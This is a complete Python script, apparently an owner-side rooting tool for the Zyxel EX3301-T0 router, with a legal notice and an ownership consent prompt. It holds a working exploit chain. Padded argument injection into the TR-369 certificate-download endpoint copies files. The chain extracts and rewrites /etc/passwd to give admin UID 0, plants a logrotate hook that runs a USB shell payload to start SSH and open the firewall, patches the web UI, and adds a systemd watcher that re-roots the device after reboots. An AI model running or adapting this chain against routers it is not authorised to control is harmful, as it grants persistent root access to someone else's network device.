#!/usr/bin/env python3
"""zyxel-godmode: persistent root + full Web UI for the Zyxel EX3301-T0.

One script, no blobs. It reuses the authenticated TR-369 certificate-copy
endpoint to plant a logrotate hook on the router; the hook restores a
UID-0 admin, LAN SSH, and an unhidden Web UI from a USB stick payload.

Workflow (USB stick moves twice):
  1. Stick in ROUTER:  ./zyxel-godmode.py extract   (copies live passwd to stick)
  2. Stick in DECK:    ./zyxel-godmode.py stage /mount/point   (builds payload)
  3. Stick in ROUTER:  ./zyxel-godmode.py restore   (roots the box, ~5 min)
  4. Optional:         ./zyxel-godmode.py install   (Deck auto-restore service)

After that, any reboot self-heals: the Deck watcher re-runs the restore.
Nothing is ever written to router flash/NVRAM; everything volatile lives
in tmpfs and the removable USB stick.

Requirements: python3, requests, pycryptodome.

LEGAL - READ FIRST (full notice in LEGAL.md; not legal advice):
  * You will use this ONLY on devices you own or are expressly authorised
    to administer. Accessing anyone else's device/network is a criminal
    offence in most jurisdictions (UK Computer Misuse Act 1990, US CFAA,
    EU equivalents). Many units of this model are ISP-owned: check your
    contract before touching one, or use a purchased unit.
  * Anti-circumvention law may apply (DMCA 1201, EU 2001/29/EC Art. 6).
  * Nothing here writes router flash: a power cycle restores stock. That
    reduces technical risk only - it does not remove contractual or legal
    risk (breach of terms, void warranty, service termination).
  * NO WARRANTY. NO LIABILITY. YOU INDEMNIFY THE AUTHORS. Bricked devices,
    lost service, and legal costs are your risk. See LEGAL.md sections 5-7.
  * Redistribution includes no proprietary firmware, device secrets,
    provider credentials, or third-party code.
"""
import argparse
import base64
import contextlib
import getpass
import io
import json
import os
import subprocess
import sys
import time
from urllib.parse import quote

try:
    import requests
    import urllib3
    from Crypto.Cipher import AES, PKCS1_v1_5
    from Crypto.PublicKey import RSA
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    sys.exit('missing dependency: pip install requests pycryptodome')

urllib3.disable_warnings()

AES_KEY = b'\x42' * 32
IV = b'\x42' * 16
APP_VERSION_TAG = 'godmode1'

BOOT_SH = """#!/bin/sh
MNT=""
for d in /mnt/usb*; do
  [ -f "$d/payload/passwd" ] && MNT="$d"
done
[ -z "$MNT" ] && exit 1
cp "$MNT/payload/passwd" /etc/passwd
[ -f "$MNT/payload/orig_logrotate.conf" ] && cp "$MNT/payload/orig_logrotate.conf" /var/logrotate.d/sys_logrotate.conf
ps | grep -q "[d]ropbear" || dropbear -p 192.168.1.1:22
iptables -D INPUT -p tcp -s 192.168.1.0/24 --dport 22 -j ACCEPT 2>/dev/null
iptables -I INPUT 1 -p tcp -s 192.168.1.0/24 --dport 22 -j ACCEPT
if [ -f "$MNT/payload/index_hidden.html" ] && [ -f "$MNT/payload/app_patched.js" ]; then
  if ! mount | grep -q " /web "; then
    rm -rf /tmp/web
    cp -a /web /tmp/web
    cp "$MNT/payload/index_hidden.html" /tmp/web/index.html
    cp "$MNT/payload/app_patched.js" /tmp/web/static/js/app.js
    mount --bind /tmp/web /web
  fi
fi
echo "root hook applied from $MNT at $(date)" > /tmp/root_boot.log
"""

HOOK_LOGROTATE = """/tmp/root_trigger.log
{
 size=1
 rotate 1
 copytruncate
 postrotate
   for d in /mnt/usb*; do [ -f "$d/payload/boot.sh" ] && /bin/sh "$d/payload/boot.sh"; done
 endscript
}
"""

ORIG_LOGROTATE = """create
/var/log/*.log
{
 copytruncate
 size=32k
 rotate 1
}
"""

TRIGGER_LOG = "trigger\n"

FLAG_KEYS = (
    "'hideTELNET','hideFTP','hideDSL','hideOAM','hideMcast','hide802_1x',"
    "'hideCCWan','hideIGMP_MLD','hideEthPwmgmt','hideVoip','hideVoiceIVR',"
    "'hideVoiceSRTP','hide_SIPoverTLS'"
)

# (menu, title, title_m, id, link) — every server-stripped entry whose page
# route exists in the build. Entries for compiled-out pages (PacketCap,
# IPSecVPN, EoGRE, Avast, MAC/IP tables, GPON/Cellular status,
# MultipleConfig, SFPManagement, TWAMP, Rport, PortBinding) are omitted:
# they would only redirect back home.
MENU_ENTRIES = [
 ("network_setting",("Broadband","Network.sublist.Broadband","Broadband","Broadband")),
 ("network_setting",("Routing","Network.sublist.Routing","Routing","Routing")),
 ("network_setting",("QoS","Network.sublist.QoS","QoS","QoS")),
 ("network_setting",("IGMP/MLD","Network.sublist.IGMP","IGMP_MLD","IGMPMLD")),
 ("network_setting",("VLAN Group","Network.sublist.VlanGroup","Vlan_Group","VlanGroup")),
 ("network_setting",("Interface Grouping","Network.sublist.InterfaceGrouping","Interface_Grouping","InterfaceGrouping")),
 ("network_setting",("Tunnel Setting","Network.sublist.TunnelSetting","Tunnel_Setting","TunnelSetting")),
 ("network_setting",("Home Connectivity","Network.sublist.HomeConnectivity","Home_Connectivity","HomeConnectivity")),
 ("network_setting",("Networking","Network.sublist.Networking","Networking","Networking")),
 ("security",("MAC Filter","Security.sublist.MACFilter","MAC_Filter","MACFilter")),
 ("security",("IP Filter","Security.sublist.IPFilter","IP_Filter","IPFilter")),
 ("security",("Parental Control","Security.sublist.ParentalControl","Parental_Control","ParentalControl")),
 ("security",("Scheduler Rule","Security.sublist.SchedulerRule","Scheduler_Rule","SchedulerRule")),
 ("security",("Certificates","Security.sublist.Certificates","Certificates","Certificates")),
 ("security",("PPTP VPN","Security.sublist.PPTPVPN","PPTP_VPN","PPTPVPN")),
 ("security",("L2TP VPN","Security.sublist.VPN","VPN","VPN")),
 ("voip",("SIP","VoIP.sublist.SIP","SIP","SIP")),
 ("voip",("Phone","VoIP.sublist.Phone","Phone","Phone")),
 ("voip",("Call Rule","VoIP.sublist.CallRule","Call_Rule","CallRule")),
 ("system_monitor",("Log","System.sublist.Log","Log","Log")),
 ("system_monitor",("ARP Table","System.sublist.ARPTable","ARP_Table","ARPTable")),
 ("system_monitor",("Routing Table","System.sublist.RoutingTable","Routing_Table","RoutingTable")),
 ("system_monitor",("Multicast Status","System.sublist.MulticastStatus","McastSt","MulticastStatus")),
 ("system_monitor",("Multicast Status Table","System.sublist.MulticastStatusTable","McastStTable","MulticastStatusTable")),
 ("system_monitor",("IGMP Snooping Status","System.sublist.IgmpSnoopStatusTable","IgmpSnoopStTable","IgmpSnoopStatusTable")),
 ("system_monitor",("xDSL Statistics","System.sublist.xDSLStatistics","xDSL_Statistics","XDSLStatistics")),
 ("system_monitor",("Steering Status","System.sublist.SteeringStatus","Steering_Status","SteeringStatus")),
 ("system_monitor",("Cellular Statistics","System.sublist.CellularStatistics","WWAN_Statistics","CellularStatistics")),
 ("maintenance",("Operation Mode","Maintenance.sublist.OperationMode","Operation_Mode","OperationMode")),
 ("maintenance",("Remote Management","Maintenance.sublist.RemoteMGMT","Remote_MGMT","RemoteManagement")),
 ("maintenance",("SP Domain","Maintenance.sublist.SPDomain","SP_Domain","SPDomain")),
 ("maintenance",("TR069 Client","Maintenance.sublist.TR069Client","TR-069_Client","TR069Client")),
 ("maintenance",("TR369 Local Agent","Maintenance.sublist.TR369LocalAgent","TR369_LocalAgent","TR369LocalAgent")),
 ("maintenance",("ZyEE","Maintenance.sublist.ZyEE","ZyEE","ZyEE")),
 ("maintenance",("ESG","Maintenance.sublist.ESG","ESG","ESG")),
 ("maintenance",("SNMP","Maintenance.sublist.SNMP","SNMP","SNMP")),
 ("maintenance",("Time","Maintenance.sublist.Time","Time","Time")),
 ("maintenance",("Email Notification","Maintenance.sublist.EmailNotification","Email_Notify","EmailNotification")),
 ("maintenance",("Log Setting","Maintenance.sublist.LogSetting","Log_Setting","LogSetting")),
 ("maintenance",("Firmware Upgrade","Maintenance.sublist.FirmwareUpgrade","Firmware_Upgrade","FirmwareUpgrade")),
 ("maintenance",("Backup&Restore","Maintenance.sublist.BackupRestore","Backup_Restore","Backup")),
 ("maintenance",("Proximity Sensor","Maintenance.sublist.ProximitySensor","Proximity_Sensor","ProximitySensor")),
 ("maintenance",("GPON","Maintenance.sublist.GPON","Gpon","GPON")),
 ("maintenance",("EDNS","Maintenance.sublist.EDNS","EDNS","EDNS")),
 ("maintenance",("Port Mirror","Maintenance.sublist.PortMirrorMaintenance","PortMirror","PortMirror")),
]

FLAG_SCRIPT_TMPL = (
    "<script>(function(){setInterval(function(){"
    "var e=document.querySelector('#app'),v=e&&e.__vue__,s=v&&v.$store;"
    "if(!s||!s.state||!s.state.guiFlag)return;var f=s.state.guiFlag,k=[%s],c=0;"
    "for(var i=0;i<k.length;i++){if(k[i] in f&&f[k[i]]!==false){f[k[i]]=false;c++}}"
    "if(c){try{s.state.guiFlag=Object.assign({},f)}catch(x){}}"
    "},2000)})();</script>"
)


class ZyxelWeb:
    def __init__(self, url, user, password):
        self.url = url
        self.user = user
        self.password = password
        self.r = requests.Session()
        self.r.trust_env = False
        self.r.verify = False
        self.sessionkey = None

    def _encrypt_request(self, data):
        cipher = AES.new(AES_KEY, AES.MODE_CBC, IV)
        content = cipher.encrypt(pad(json.dumps(data).encode('ascii'), 16))
        return {
            'content': base64.b64encode(content).decode('ascii'),
            'iv': base64.b64encode(IV).decode('ascii'),
            'key': '',
        }

    def _decrypt_response(self, data):
        if 'iv' not in data or 'content' not in data:
            raise RuntimeError(f'router error response: {data}')
        iv = base64.b64decode(data['iv'])[:16]
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(base64.b64decode(data['content'])), 16)

    def perform_login(self):
        res = self.r.get(f'{self.url}/getRSAPublickKey', timeout=10)
        pubkey = RSA.import_key(res.json()['RSAPublicKey'])
        enc_aes_key = PKCS1_v1_5.new(pubkey).encrypt(base64.b64encode(AES_KEY))
        login_data = {
            'Input_Account': self.user,
            'Input_Passwd': base64.b64encode(self.password.encode('ascii')).decode('ascii'),
            'RememberPassword': 0,
            'SHA512_password': False,
        }
        enc_request = self._encrypt_request(login_data)
        enc_request['key'] = base64.b64encode(enc_aes_key).decode('ascii')
        enc_response = self.r.post(f'{self.url}/UserLogin', json.dumps(enc_request), timeout=10)
        response = json.loads(self._decrypt_response(enc_response.json()))
        if response.get('result') == 'ZCFG_SUCCESS':
            self.sessionkey = response['sessionkey']
            return True
        print(f'[-] login failed: {response}')
        return False


def copy_via_handler(web, name):
    """Copy on the router via the TR-369 handler.

    With two operands, cp treats the destination as a directory and
    appends the source basename — so destinations must be directories.
    Keeping `name` at 128 bytes truncates away the temp-file destination.
    """
    padded = name[:128].ljust(128, ' ')
    url = (
        f'{web.url}/cgi-bin/TR369Certificates?action=download'
        f'&name={quote(padded, safe="/")}&sessionkey={web.sessionkey}'
    )
    response = web.r.get(url, timeout=25)
    return response.status_code, response.headers.get('Content-Type', ''), len(response.content)


def patch_app_js(stock):
    """Force hidden flags off + restore stripped menu entries."""
    old_flag = 'updateGuiFlag:function(e,t){e.guiFlag=t}'
    if stock.count(old_flag) != 1:
        raise ValueError('flag mutation not found exactly once; firmware differs')
    new_flag = (
        'updateGuiFlag:function(e,t){var k=[' + FLAG_KEYS + '];'
        'if(t){for(var i=0;i<k.length;i++){if(k[i] in t)t[k[i]]=!1}'
        "console.log('ROOT_UI_PATCH DSL='+t.hideDSL+' TELNET='+t.hideTELNET+' FTP='+t.hideFTP)}"
        'e.guiFlag=t}'
    )
    stock = stock.replace(old_flag, new_flag)
    restore = (
        'function(L){try{'
        'function M(t){for(var i=0;i<L.length;i++){if(L[i].menutitle===t)return L[i]}return null}'
        'function add(t,e){var m=M(t);if(m&&m.submenu){'
        'for(var i=0;i<m.submenu.length;i++){if(m.submenu[i].id===e.id)return}'
        'm.submenu.push(e)}}'
    )
    for menu, (title, tm, iid, link) in MENU_ENTRIES:
        restore += (
            f'add("{menu}",{{title:"{title}",title_m:"{tm}",'
            f'id:"{iid}",link:"{link}"}});'
        )
    restore += '}catch(x){}return L}'
    old_commit = 'v.a.commit("updateMenuList",e.MenuList)'
    if stock.count(old_commit) != 1:
        raise ValueError('MenuList commit not found exactly once; firmware differs')
    return stock.replace(old_commit, 'v.a.commit("updateMenuList",' + restore + '(e.MenuList))')


def patch_index(html, tag=APP_VERSION_TAG):
    """Cache-bust app.js + add a flag-override fallback script."""
    marker = '/static/js/app.js'
    if marker not in html:
        raise ValueError('app.js reference not found in index.html')
    html = html.replace(marker, marker + f'?v={tag}', 1)
    if '<!--ROOT_UI_PATCH_FALLBACK-->' not in html:
        fallback = FLAG_SCRIPT_TMPL % FLAG_KEYS
        html = html.replace('</body>', '<!--ROOT_UI_PATCH_FALLBACK-->' + fallback + '</body>')
    return html


def validate_passwd(data):
    lines = data.decode('ascii').splitlines()
    entries = [line.split(':') for line in lines if line.count(':') == 6]
    if len(entries) < 3:
        raise ValueError('not a valid passwd file')
    by_name = {e[0]: e for e in entries}
    if by_name.get('root', [None, None, None])[2] != '0':
        raise ValueError('no root UID 0 entry')
    if 'admin' not in by_name:
        raise ValueError('no admin entry')
    return entries


def make_payload_passwd(base_text):
    out = []
    changed = 0
    for line in base_text.splitlines():
        fields = line.split(':')
        if fields[0] == 'admin' and len(fields) == 7:
            fields[2] = '0'
            fields[3] = '0'
            fields[6] = '/bin/sh'
            line = ':'.join(fields)
            changed += 1
        out.append(line)
    if changed != 1:
        raise ValueError('expected exactly one admin entry')
    return '\n'.join(out) + '\n'


def get_password(args):
    if args.password_file:
        with open(args.password_file, 'r', encoding='ascii') as f:
            for line in f:
                if line.startswith('password='):
                    return line.split('=', 1)[1].strip()
                if line.strip() and '=' not in line:
                    return line.strip()
        raise ValueError('no password found in password file')
    if os.environ.get('ZYXEL_ADMIN_PASSWORD'):
        return os.environ['ZYXEL_ADMIN_PASSWORD']
    return getpass.getpass('Router web-admin password (hidden, never stored): ')


def login(args):
    web = ZyxelWeb(args.host, 'admin', get_password(args))
    with contextlib.redirect_stdout(io.StringIO()):
        ok = web.perform_login()
    if not ok:
        sys.exit('Login failed; check the admin password.')
    return web


def ssh_uid0(timeout=8):
    env = dict(os.environ)
    askpass = os.environ.get('SSH_ASKPASS', '/tmp/exfw/.askpass')
    env.update({'SSH_ASKPASS': askpass, 'SSH_ASKPASS_REQUIRE': 'force', 'DISPLAY': ':0'})
    try:
        result = subprocess.run(
            ['setsid', '-w', 'ssh', '-o', 'StrictHostKeyChecking=no',
             '-o', 'UserKnownHostsFile=/dev/null',
             '-o', 'PreferredAuthentications=password',
             '-o', 'PubkeyAuthentication=no',
             '-o', 'NumberOfPasswordPrompts=1',
             '-o', f'ConnectTimeout={timeout}',
             'admin@192.168.1.1', 'id'],
            env=env, capture_output=True, text=True, timeout=timeout + 20,
        )
    except Exception as exc:
        return False, type(exc).__name__
    ok = result.returncode == 0 and 'uid=0' in result.stdout
    return ok, result.stdout.strip().splitlines()[-1][:120] if result.stdout else f'exit={result.returncode}'


def cmd_status(args):
    print(f'[*] router: {args.host}')
    try:
        web = login(args)
    except SystemExit as exc:
        print(f'[-] {exc}')
        return 2
    headers = {'CSRFToken': web.sessionkey}
    response = web.r.get(f'{args.host}/cgi-bin/DAL?oid=usb_info', headers=headers, timeout=15)
    info = json.loads(web._decrypt_response(response.json()))
    volumes = [i.get('Volume') for o in info.get('Object', []) for i in o.get('Usb Info', [])]
    print(f'[*] USB volumes: {volumes}')
    healthy, detail = ssh_uid0()
    print(f'[*] SSH root: {"YES" if healthy else "NO"} ({detail})')
    try:
        served = requests.get(f'{args.host}/static/js/app.js', timeout=30, verify=False).text
        patched = 'updateMenuList",function(L)' in served or 'ROOT_UI_PATCH' in served
        print(f'[*] UI patch served: {"YES" if patched else "NO"}')
    except Exception as exc:
        print(f'[-] could not fetch app.js: {exc}')
    return 0


def cmd_extract(args):
    """Stick must be IN THE ROUTER. Copies live /etc/passwd to its root."""
    web = login(args)
    headers = {'CSRFToken': web.sessionkey}
    response = web.r.get(f'{args.host}/cgi-bin/DAL?oid=usb_info', headers=headers, timeout=15)
    info = json.loads(web._decrypt_response(response.json()))
    volumes = [i.get('Volume') for o in info.get('Object', []) for i in o.get('Usb Info', [])
               if str(i.get('Volume', '')).startswith('usb')]
    if len(volumes) != 1:
        sys.exit(f'Refusing: expected one USB volume, found {volumes!r}')
    mount = '/mnt/' + volumes[0]
    status, ctype, _ = copy_via_handler(web, f'a /etc/passwd {mount}')
    print(f'[*] copy /etc/passwd -> USB root: HTTP {status}')
    if status != 200:
        sys.exit('Copy failed; nothing was changed.')
    print('[*] Done. Move the stick to this machine and run: stage <mountpoint>')


def cmd_stage(args):
    """Stick must be on THIS machine. Builds payload/ from the USB passwd."""
    mount = args.mount.rstrip('/')
    base_path = os.path.join(mount, 'passwd')
    if not os.path.isfile(base_path):
        sys.exit(f'No passwd file at {base_path}. Run extract first (stick in router).')
    with open(base_path, 'rb') as f:
        base_data = f.read()
    validate_passwd(base_data)
    payload = os.path.join(mount, 'payload')
    after = os.path.join(payload, 'after')
    os.makedirs(after, exist_ok=True)
    with open(os.path.join(payload, 'passwd'), 'w', encoding='ascii') as f:
        f.write(make_payload_passwd(base_data.decode('ascii')))
    with open(os.path.join(payload, 'boot.sh'), 'w', encoding='ascii') as f:
        f.write(BOOT_SH)
    os.chmod(os.path.join(payload, 'boot.sh'), 0o755)
    with open(os.path.join(payload, 'sys_logrotate.conf'), 'w', encoding='ascii') as f:
        f.write(HOOK_LOGROTATE)
    with open(os.path.join(payload, 'root_trigger.log'), 'w', encoding='ascii') as f:
        f.write(TRIGGER_LOG)
    with open(os.path.join(payload, 'orig_logrotate.conf'), 'w', encoding='ascii') as f:
        f.write(ORIG_LOGROTATE)
    print('[*] fetching stock web UI from the router (unauthenticated static files)...')
    host = args.host
    index_html = requests.get(f'{host}/', timeout=20, verify=False).text
    app_js = requests.get(f'{host}/static/js/app.js', timeout=60, verify=False).text
    with open(os.path.join(payload, 'index_hidden.html'), 'w', encoding='utf-8') as f:
        f.write(patch_index(index_html))
    with open(os.path.join(payload, 'app_patched.js'), 'w', encoding='utf-8') as f:
        f.write(patch_app_js(app_js))
    os.sync()
    print(f'[*] payload staged at {payload}. Move the stick back to the router, then run: restore')


def cmd_restore(args):
    """Stick must be IN THE ROUTER. Installs the hook and waits for root."""
    web = login(args)
    headers = {'CSRFToken': web.sessionkey}
    response = web.r.get(f'{args.host}/cgi-bin/DAL?oid=usb_info', headers=headers, timeout=15)
    info = json.loads(web._decrypt_response(response.json()))
    volumes = [i.get('Volume') for o in info.get('Object', []) for i in o.get('Usb Info', [])
               if str(i.get('Volume', '')).startswith('usb')]
    if len(volumes) != 1:
        sys.exit(f'Refusing: expected one USB volume, found {volumes!r}')
    mount = '/mnt/' + volumes[0]
    print(f'[*] USB volume: {mount}')
    for name in (f'a {mount}/payload/sys_logrotate.conf /var/logrotate.d',
                 f'a {mount}/payload/root_trigger.log /tmp'):
        status, _, _ = copy_via_handler(web, name)
        print(f'[*] {name!r} -> HTTP {status}')
        if status != 200:
            sys.exit('Handler rejected the request; nothing was changed.')
    print('[*] hook installed; waiting up to 6 minutes for the logrotate job...')
    deadline = time.time() + 360
    while time.time() < deadline:
        healthy, detail = ssh_uid0()
        if healthy:
            print(f'[*] ROOT RESTORED: {detail}')
            return 0
        time.sleep(15)
        print('    still waiting...')
    sys.exit('Timed out. Is the stick still inserted with a staged payload?')


def cmd_watch(args):
    """Run forever: re-root automatically whenever SSH root goes missing."""
    print('[*] watcher started (Ctrl-C to stop)')
    last_attempt = 0.0
    while True:
        healthy, detail = ssh_uid0()
        if healthy:
            time.sleep(30)
            continue
        print(f'[!] root SSH missing ({detail})')
        if time.time() - last_attempt < 300:
            time.sleep(30)
            continue
        last_attempt = time.time()
        result = subprocess.run(
            [sys.executable, os.path.abspath(__file__), '--yes', 'restore',
             '--host', args.host] +
            (['--password-file', args.password_file] if args.password_file else []),
            capture_output=True, text=True, timeout=420,
        )
        print(f'[*] restore {"succeeded" if result.returncode == 0 else "FAILED"}')
        print(result.stdout[-500:] + result.stderr[-500:])
        time.sleep(30)


SERVICE_UNIT = """[Unit]
Description=EX3301-T0 auto root restore watcher
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart={python} {script} watch --host {host}{pwfile}
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
"""


def cmd_install(args):
    unit_dir = os.path.expanduser('~/.config/systemd/user')
    os.makedirs(unit_dir, exist_ok=True)
    pwfile = f' --password-file {args.password_file}' if args.password_file else ''
    unit = SERVICE_UNIT.format(python=sys.executable, script=os.path.abspath(__file__),
                               host=args.host, pwfile=pwfile)
    path = os.path.join(unit_dir, 'zyxel-godmode.service')
    with open(path, 'w', encoding='utf-8') as f:
        f.write(unit)
    for command in (['systemctl', '--user', 'daemon-reload'],
                    ['systemctl', '--user', 'enable', 'zyxel-godmode.service'],
                    ['systemctl', '--user', 'start', 'zyxel-godmode.service']):
        result = subprocess.run(command, capture_output=True, text=True)
        print(f'[*] {" ".join(command[1:])}: {result.returncode}')
    print('[*] installed. The watcher keeps root (needs the password file or env var).')


def cmd_uninstall(_args):
    for command in (['systemctl', '--user', 'stop', 'zyxel-godmode.service'],
                    ['systemctl', '--user', 'disable', 'zyxel-godmode.service']):
        subprocess.run(command, capture_output=True)
    path = os.path.expanduser('~/.config/systemd/user/zyxel-godmode.service')
    if os.path.exists(path):
        os.remove(path)
    print('[*] watcher removed (router keeps current state until next reboot).')


CONSENT_PHRASE = 'I OWN THIS DEVICE'


def require_consent(args):
    if args.yes:
        return
    legal = __doc__.split('LEGAL - READ FIRST', 1)[1].strip()
    print('=' * 70)
    print(legal)
    print('=' * 70)
    print('Full notice: LEGAL.md (not legal advice; consult a lawyer if unsure).')
    try:
        answer = input(f'\nType "{CONSENT_PHRASE}" to continue: ').strip()
    except EOFError:
        sys.exit('Consent not given; nothing was changed.')
    if answer != CONSENT_PHRASE:
        sys.exit('Consent not given; nothing was changed.')


def main():
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument('--host', default='http://192.168.1.1')
    parser.add_argument('--yes', action='store_true',
                        help='skip the ownership consent prompt '
                             '(only use on your own device; scripts only)')
    parser.add_argument('--password-file',
                        help='file with "password=..." (mode 0600) or a bare password; '
                             'else $ZYXEL_ADMIN_PASSWORD, else prompt')
    sub = parser.add_subparsers(dest='command', required=True)
    sub.add_parser('status', help='show router/USB/SSH/UI state (read-only + login)')
    sub.add_parser('extract', help='copy live passwd to USB (stick in ROUTER)')
    stage = sub.add_parser('stage', help='build payload on USB (stick on THIS machine)')
    stage.add_argument('mount', help='USB mountpoint, e.g. /run/media/$USER/ROUTERSTICK')
    sub.add_parser('restore', help='install hook and wait for root (stick in ROUTER)')
    sub.add_parser('watch', help='daemon: auto-restore whenever root is missing')
    sub.add_parser('install', help='install the watcher as a systemd user service')
    sub.add_parser('uninstall', help='remove the watcher service')
    args = parser.parse_args()
    if not args.host.startswith('http'):
        args.host = 'http://' + args.host
    if args.command in ('extract', 'stage', 'restore'):
        require_consent(args)
    return {'status': cmd_status, 'extract': cmd_extract, 'stage': cmd_stage,
            'restore': cmd_restore, 'watch': cmd_watch, 'install': cmd_install,
            'uninstall': cmd_uninstall}[args.command](args)


if __name__ == '__main__':
    raise SystemExit(main())
